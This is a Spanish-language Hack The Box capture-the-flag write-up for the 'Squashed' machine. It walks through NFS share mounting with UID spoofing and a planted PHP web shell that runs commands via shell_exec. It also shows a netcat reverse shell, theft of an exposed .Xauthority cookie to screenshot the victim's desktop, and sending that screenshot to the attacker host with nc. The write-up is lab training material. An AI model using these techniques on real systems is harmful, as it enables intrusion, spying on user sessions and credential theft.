---
layout: single
title: Squashed - Hack The Box
excerpt: "En este post estaremos resolviendo la maquina Squashed de la plataforma de Hackthebox que es de dificultad facil donde tendremos que enumerar el servicio NFS de la maquina para poder hacer una montura de los recursos que comparte y asi poder crear una webshell para ganar acceso como el usuario alex para ser root tendremos que abusar del archivo .Xauthority para poder tomar una captura de pantalla donde podremos ver la contraseña del usuario root gracias a que el usuario esta corriendo un gestor de contraseñas en tiempo real"
date: 2023-04-17
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-squashed/icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:  
  - NFS Enumeration
  - Web shell
  - Abusing .Xauthority file
  - Screenshot display
---

<p align="center">
<img src="/assets/images/htb-writeup-squashed/icon.png">
</p>

```bash
❯ ping -c 1 10.10.11.191
PING 10.10.11.191 (10.10.11.191) 56(84) bytes of data.
64 bytes from 10.10.11.191: icmp_seq=1 ttl=63 time=118 ms

--- 10.10.11.191 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 117.652/117.652/117.652/0.000 ms
❯ whichSystem.py 10.10.11.191

10.10.11.191 (ttl -> 63): Linux
```

## PortScan

```bash
❯ nmap -sCV -p22,80,111,58191,2049,36547,52911 10.10.11.191 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-16 18:22 CST
Nmap scan report for 10.10.11.191
Host is up (0.12s latency).

PORT      STATE  SERVICE VERSION
22/tcp    open   ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp    open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Built Better
|_http-server-header: Apache/2.4.41 (Ubuntu)
111/tcp   open   rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      36179/tcp6  mountd
|   100005  1,2,3      45358/udp   mountd
|   100005  1,2,3      55033/udp6  mountd
|   100005  1,2,3      58191/tcp   mountd
|   100021  1,3,4      32819/udp6  nlockmgr
|   100021  1,3,4      37109/tcp   nlockmgr
|   100021  1,3,4      37329/udp   nlockmgr
|   100021  1,3,4      41835/tcp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open   nfs_acl 3 (RPC #100227)
36547/tcp closed unknown
52911/tcp closed unknown
58191/tcp open   mountd  1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

```bash
❯ nmap --script=http-enum -p80 10.10.11.191 -oN webScan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-16 18:27 CST
Nmap scan report for 10.10.11.191
Host is up (0.11s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|_  /js/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
```

## Enumeracion 

Estas son las tecnologias que corren en la web por el puerto `80`

```ruby
❯ whatweb http://10.10.11.191
http://10.10.11.191 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.191], JQuery[3.0.0], Script, Title[Built Better], X-UA-Compatible[IE=edge]

```

Esta es la pagina web

![](/assets/images/htb-writeup-squashed/Web1.png)

Bueno no encontramos gran cosa asi que vamos a enumerar el puerto que vimos el `2049/tcp`

Bueno en la pagina de `hacktricks` nos dan informacion sobre el servicio

<https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting>

Vamos a ver si hay recursos compartidos en la maquina que nos podamos montar en nuestro equipo

![](/assets/images/htb-writeup-squashed/Web2.png)

```bash
❯ showmount -e 10.10.11.191
Export list for 10.10.11.191:
/home/ross    *
/var/www/html *
```

Vamos a hacer una montura

```bash
❯ mkdir /mnt/ross
❯ mkdir /mnt/web_server
❯ mount -t nfs 10.10.11.191:/home/ross /mnt/ross
❯ mount -t nfs 10.10.11.191:/var/www/html /mnt/web_server
```

Vemos que este correcto

```bash
❯ ll
drwxr-xr-x 1001 scanner  4.0 KB Sun Apr 16 17:10:44 2023  ross
drwxr-xr-- 2017 www-data 4.0 KB Sun Apr 16 18:40:01 2023  web_server
```

Vemos esto

```bash
❯ tree -fas
.
├── [       4096]  ./ross
│   ├── [          9]  ./ross/.bash_history -> /dev/null
│   ├── [       4096]  ./ross/.cache [error opening dir]
│   ├── [       4096]  ./ross/.config [error opening dir]
│   ├── [       4096]  ./ross/Desktop
│   ├── [       4096]  ./ross/Documents
│   │   └── [       1365]  ./ross/Documents/Passwords.kdbx
│   ├── [       4096]  ./ross/Downloads
│   ├── [       4096]  ./ross/.gnupg [error opening dir]
│   ├── [       4096]  ./ross/.local [error opening dir]
│   ├── [       4096]  ./ross/Music
│   ├── [       4096]  ./ross/Pictures
│   ├── [       4096]  ./ross/Public
│   ├── [       4096]  ./ross/Templates
│   ├── [       4096]  ./ross/Videos
│   ├── [          9]  ./ross/.viminfo -> /dev/null
│   ├── [         57]  ./ross/.Xauthority
│   ├── [       2475]  ./ross/.xsession-errors
│   └── [       2475]  ./ross/.xsession-errors.old
└── [       4096]  ./web_server

14 directories, 6 files
```

No podemos ver lo que hay dentro de `web_server` por que no es nuestro identificador y el usuairo `www-data` no existe en nuestro sistema

```bash
❯ cd web_server
cd: permiso denegado: web_server
❯ ls -l
drwxr-xr-x 1001 scanner  4.0 KB Sun Apr 16 17:10:44 2023  ross
drwxr-xr-- 2017 www-data 4.0 KB Sun Apr 16 18:45:01 2023  web_server

```

Vamos a crear un nuevo usuario con ese identificador que es el `2017`

```bash
❯ useradd temp
❯ usermod -u 2017 temp
❯ groupmod -g 2017 temp
❯ id temp
uid=2017(temp) gid=2017(temp) grupos=2017(temp)
```

Ahora nosotros somos el propietario

```bash
❯ ls -l
drwxr-xr-x 1001 scanner  4.0 KB Sun Apr 16 17:10:44 2023  ross
drwxr-xr-- temp www-data 4.0 KB Sun Apr 16 18:50:01 2023  web_server

```

Ahora si podemos ver que hay dentro

```bash
❯ su temp
$ bash
┌─[temp@parrot]─[/mnt]
└──╼ $cd web_server/
┌─[temp@parrot]─[/mnt/web_server]
└──╼ $ls
css  images  index.html  js
┌─[temp@parrot]─[/mnt/web_server]
└──╼ $
```

Vemos que hay un `index.html` que es la pagina web en la pagina web de la maquina vimos que decia `FURTNITURE` si buscamos un `match` vemos que hay asi que esto esta sincronizado con la pagina web real que esta corriendo en el puerto `80`

```bash
┌─[temp@parrot]─[/mnt/web_server]
└──╼ $cat index.html | grep "FURNITURE"
                     <h1 class="furniture_text">FURNITURE</h1>
                     <h1 class="furniture_text">FURNITURE</h1>
                     <h1 class="furniture_text">FURNITURE</h1>
```

Como la `web` corre `php` podemos subir un archivo `cmd.php` para ganar accesso ala maquina pero antes vamos a crear un `.txt` para ver si podemos verlo en la web (aunque aparesca ese error en el `nano` si no lo crea XD)

```bash
┌─[temp@parrot]─[/mnt/web_server]
└──╼ $nano hola.txt
No se puede crear el directorio «/home/temp/.local/share/nano/»: No existe el fichero o el directorio
Se necesita para guardar/cargar el histórico de búsquedas o las posiciones del cursor.

┌─[temp@parrot]─[/mnt/web_server]
└──╼ $ls
css  hola.txt  images  index.html  js
┌─[temp@parrot]─[/mnt/web_server]
└──╼ $cat hola.txt 
soy vulnerable
┌─[temp@parrot]─[/mnt/web_server]
└──╼ $
```

Aqui lo vemos reflejado

![](/assets/images/htb-writeup-squashed/Web3.png)

Ahora si vamos a crear el `cmd.php`

```bash
┌─[temp@parrot]─[/mnt/web_server]
└──╼ $cat cmd.php 
<?php
	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

![](/assets/images/htb-writeup-squashed/Web4.png)

Ahora vamos a ganar accesso

![](/assets/images/htb-writeup-squashed/Web5.png)

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.11.191] 52500
bash: cannot set terminal process group (1084): Inappropriate ioctl for device
bash: no job control in this shell
alex@squashed:/var/www/html$ whoami
whoami
alex
alex@squashed:/var/www/html$ id
id
uid=2017(alex) gid=2017(alex) groups=2017(alex)
alex@squashed:/var/www/html$ 
```

Ahora vamos a hacer un tratamiento de la `tty` para poder hacer `ctrl+c` y no perdamos la `shell`

```bash
alex@squashed:/var/www/html$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
alex@squashed:/var/www/html$ 
alex@squashed:/var/www/html$ ^Z
zsh: suspended  nc -nlvp 443
```

Despues de `reset xterm` le das al `ENTER`

```bash
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
```

## Shell como alex

Nos borro el `cmd.php` asi que hay alguna tarea `cron` que se encarga de eliminarlo asi que mejor sean rapidos o vuelvan a crearlo en caso de que cuando lo pongan en la web les de un `404`

```bash
alex@squashed:/var/www/html$ ls -l
total 44
drwxr-xr-x 2 alex www-data  4096 Apr 17 01:05 css
drwxr-xr-x 2 alex www-data  4096 Apr 17 01:05 images
-rw-r----- 1 alex www-data 32532 Apr 17 01:05 index.html
drwxr-xr-x 2 alex www-data  4096 Apr 17 01:05 js
alex@squashed:/var/www/html$ 

```

Vamos a decirle nuestro directorio

```bash
alex@squashed:/var/www/html$ cd
bash: cd: HOME not set
alex@squashed:/var/www/html$ export HOME=/home/alex
alex@squashed:/var/www/html$ cd
alex@squashed:~$ 
```

## User.txt

```bash
alex@squashed:~$ ls
Desktop  Documents  Downloads  Music  Pictures	Public	Templates  Videos  snap  user.txt
alex@squashed:~$ cat user.txt 
2411b3f425b652998e5bb0f6990d0059
alex@squashed:~$ 
```

## Escalada de privilegios

Bueno si recordamos en la montura que nos creamos vimos que el usuario `ross` tenia un archivo `.Xauthority` y bueno si podemos ver ese archivo puedes asta ver asta la pantalla del usuario si esta `logueado` es peligroso tener ese archivo expuesto

```bash
$ ls -la
total 64
drwxr-xr-x 14 1001 scanner 4096 abr 16 17:10 .
drwxr-xr-x  1 root root      28 abr 16 18:40 ..
lrwxrwxrwx  1 root root       9 oct 20 08:24 .bash_history -> /dev/null
drwx------ 11 1001 scanner 4096 oct 21 09:57 .cache
drwx------ 12 1001 scanner 4096 oct 21 09:57 .config
drwxr-xr-x  2 1001 scanner 4096 oct 21 09:57 Desktop
drwxr-xr-x  2 1001 scanner 4096 oct 21 09:57 Documents
drwxr-xr-x  2 1001 scanner 4096 oct 21 09:57 Downloads
drwx------  3 1001 scanner 4096 oct 21 09:57 .gnupg
drwx------  3 1001 scanner 4096 oct 21 09:57 .local
drwxr-xr-x  2 1001 scanner 4096 oct 21 09:57 Music
drwxr-xr-x  2 1001 scanner 4096 oct 21 09:57 Pictures
drwxr-xr-x  2 1001 scanner 4096 oct 21 09:57 Public
drwxr-xr-x  2 1001 scanner 4096 oct 21 09:57 Templates
drwxr-xr-x  2 1001 scanner 4096 oct 21 09:57 Videos
lrwxrwxrwx  1 root root       9 oct 21 08:07 .viminfo -> /dev/null
-rw-------  1 1001 scanner   57 abr 16 17:10 .Xauthority
-rw-------  1 1001 scanner 2475 abr 16 17:10 .xsession-errors
-rw-------  1 1001 scanner 2475 dic 27 09:33 .xsession-errors.old
$ 
```

`Ross` esta activo

```bash
alex@squashed:~$ w
 01:15:01 up  2:04,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
ross     tty7     :0               23:10    2:04m 17.78s  0.04s /usr/libexec/gnome-session-binary --systemd --session=gnome
alex@squashed:~$ 
```

Aqui vemos mas informacion

<https://book.hacktricks.xyz/network-services-pentesting/6000-pentesting-x11>

![](/assets/images/htb-writeup-squashed/Web6.png)

Ahora vamos a crear otro usuario con ese identificador

```bash
❯ ls -la .Xauthority
.rw------- 1001 scanner 57 B Sun Apr 16 17:10:44 2023  .Xauthority
```

```bash
❯ useradd temp2
❯ usermod -u 1001 temp2
❯ su temp2
$ bash
┌─[temp2@parrot]─[/mnt/ross]
└──╼ $
```

Ahora somos el propietario

```bash
┌─[temp2@parrot]─[/mnt/ross]
└──╼ $ls -l .Xauthority 
-rw------- 1 temp2 scanner 57 abr 16 17:10 .Xauthority
┌─[temp2@parrot]─[/mnt/ross]
└──╼ $

```

No es muy legible

```bash
┌─[✗]─[temp2@parrot]─[/mnt/ross]
└──╼ $xxd .Xauthority 
00000000: 0100 000c 7371 7561 7368 6564 2e68 7462  ....squashed.htb
00000010: 0001 3000 124d 4954 2d4d 4147 4943 2d43  ..0..MIT-MAGIC-C
00000020: 4f4f 4b49 452d 3100 10d2 7847 694b b828  OOKIE-1...xGiK.(
00000030: 19b9 70b2 586a 307b 66                   ..p.Xj0{f
┌─[temp2@parrot]─[/mnt/ross]
└──╼ $
```

Vamos a seguir los pasos que encontramos en `hacktriks`

Vamos a pasarnos primero el `.Xauthority` a la maquina victima para que tengan el mismo

```bash
┌─[temp2@parrot]─[/mnt/ross]
└──╼ $python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

```bash
alex@squashed:~$ wget http://10.10.14.8:8080/.Xauthority
--2023-04-17 01:51:37--  http://10.10.14.8:8080/.Xauthority
Connecting to 10.10.14.8:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 57 [application/octet-stream]
Saving to: '.Xauthority'

.Xauthority         100%[===================>]      57  --.-KB/s    in 0.1s    

2023-04-17 01:51:37 (449 B/s) - '.Xauthority' saved [57/57]
```

Ahora si verificamos la conexion nos va a mostrar un `output` muy grande pero no lo voy a poner por que es muy grande (eso dijo ella)

```bash
alex@squashed:~$ xdpyinfo -display :0
```

Vemos algo de `keePassXC`

```bash
alex@squashed:~$ xwininfo -root -tree -display :0

xwininfo: Window id: 0x533 (the root window) (has no name)

  Root window id: 0x533 (the root window) (has no name)
  Parent window id: 0x0 (none)
     26 children:
     0x80000b "gnome-shell": ("gnome-shell" "Gnome-shell")  1x1+-200+-200  +-200+-200
        1 child:
        0x80000c (has no name): ()  1x1+-1+-1  +-201+-201
     0x800021 (has no name): ()  802x575+-1+26  +-1+26
        1 child:
        0x1e00006 "Passwords - KeePassXC": ("keepassxc" "keepassxc")  800x536+1+38  +0+64
           1 child:
           0x1e000fe "Qt NET_WM User Time Window": ()  1x1+-1+-1  +-1+63
     0x1e00008 "Qt Client Leader Window": ()  1x1+0+0  +0+0
     0x2000001 "keepassxc": ("keepassxc" "Keepassxc")  10x10+10+10  +10+10
     0x800017 (has no name): ()  1x1+-1+-1  +-1+-1
     0x1e00004 "Qt Selection Owner for keepassxc": ()  3x3+0+0  +0+0
     0x1c00001 "gsd-keyboard": ("gsd-keyboard" "Gsd-keyboard")  10x10+10+10  +10+10
     0x1a00001 "evolution-alarm-notify": ("evolution-alarm-notify" "Evolution-alarm-notify")  10x10+10+10  +10+10
     0x1800002 (has no name): ()  10x10+0+0  +0+0
     0x1600001 "gsd-wacom": ("gsd-wacom" "Gsd-wacom")  10x10+10+10  +10+10
     0x1800001 "gsd-xsettings": ("gsd-xsettings" "Gsd-xsettings")  10x10+10+10  +10+10
     0x1400001 "gsd-media-keys": ("gsd-media-keys" "Gsd-media-keys")  10x10+10+10  +10+10
     0x1200001 "gsd-color": ("gsd-color" "Gsd-color")  10x10+10+10  +10+10
     0x1000001 "gsd-power": ("gsd-power" "Gsd-power")  10x10+10+10  +10+10
     0xc00001 "ibus-extension-gtk3": ("ibus-extension-gtk3" "Ibus-extension-gtk3")  10x10+10+10  +10+10
     0xa00003 "ibus-xim": ()  1x1+0+0  +0+0
        1 child:
        0xa00004 (has no name): ()  1x1+-1+-1  +-1+-1
     0xa00001 "ibus-x11": ("ibus-x11" "Ibus-x11")  10x10+10+10  +10+10
     0x800011 (has no name): ()  1x1+-100+-100  +-100+-100
     0x80000f (has no name): ()  1x1+-1+-1  +-1+-1
     0x800009 (has no name): ()  1x1+-100+-100  +-100+-100
     0x800008 (has no name): ()  1x1+-100+-100  +-100+-100
     0x800007 (has no name): ()  1x1+-100+-100  +-100+-100
     0x800006 "GNOME Shell": ()  1x1+-100+-100  +-100+-100
     0x800001 "gnome-shell": ("gnome-shell" "Gnome-shell")  10x10+10+10  +10+10
     0x600008 (has no name): ()  1x1+-100+-100  +-100+-100
     0x800010 "mutter guard window": ()  800x600+0+0  +0+0

alex@squashed:~$ 
```

En `/mnt` vimos esto `Passwords.kdbx`

```bash
❯ find .
.
./ross
./ross/Music
./ross/Pictures
./ross/.xsession-errors.old
./ross/.cache
find: ‘./ross/.cache’: Permiso denegado
./ross/Public
./ross/Documents
./ross/Documents/Passwords.kdbx
```

Y vemos el archivo

```bash
❯ cd ross/Documents
❯ ls
 Passwords.kdbx
```

Vamos a ver si tiene contraseñas

```bash
❯ keepassxc Passwords.kdbx
```

Y si tiene

![](/assets/images/htb-writeup-squashed/Web7.png)

Vamos a usar `keepass2john` para ver si la contraseña esta en el `rockyou` pero la version no esta soportada `F`

```bash
❯ keepass2john Passwords.kdbx
! Passwords.kdbx : File version '40000' is currently not supported!
```

Si vamos a `hacktricks` podemos sacar una captura de pantalla por que cuando checamos la conexion vimos algo del `keypass` tal vez el usuario tiene abierto eso y podemos sacar la captura de pantalla para ver la contraseña 

```bash
alex@squashed:/tmp$ xwd -root -screen -silent -display :0 > screenshot.xwd
```

```bash
alex@squashed:/tmp$ file screenshot.xwd 
screenshot.xwd: XWD X Window Dump image data, "xwdump", 800x600x24
alex@squashed:/tmp$ 
```

Vamos a traernolo a nuestra maquina de atacante

```bash
❯ nc -nlvp 443 > screenshot.xwd
listening on [any] 443 ...
```

```bash
alex@squashed:/tmp$ nc 10.10.14.8 443 < screenshot.xwd
```

Y lo recibimos

```bash
❯ nc -nlvp 443 > screenshot.xwd
listening on [any] 443 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.11.191] 34718

```

Ahora tenemos que convertirlo a `.png`

```bash
❯ convert screenshot.xwd screenshot.png
```

```bash
❯ file screenshot.png
screenshot.png: PNG image data, 800 x 600, 8-bit/color RGB, non-interlaced

```

Aqui vemos la captura de pantalla

![](/assets/images/htb-writeup-squashed/Web8.png)

## Root flag

```bash
alex@squashed:/tmp$ su root
Password: 
root@squashed:/tmp# whoami
root
root@squashed:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@squashed:/tmp# cd /root
root@squashed:~# ls
Desktop  Documents  Downloads  Music  Pictures  Public  root.txt  scripts  snap  Templates  Videos
root@squashed:~# cat root.txt 
b51b91e8c62ad3b8d90b75c414b7d143
root@squashed:~# 
```
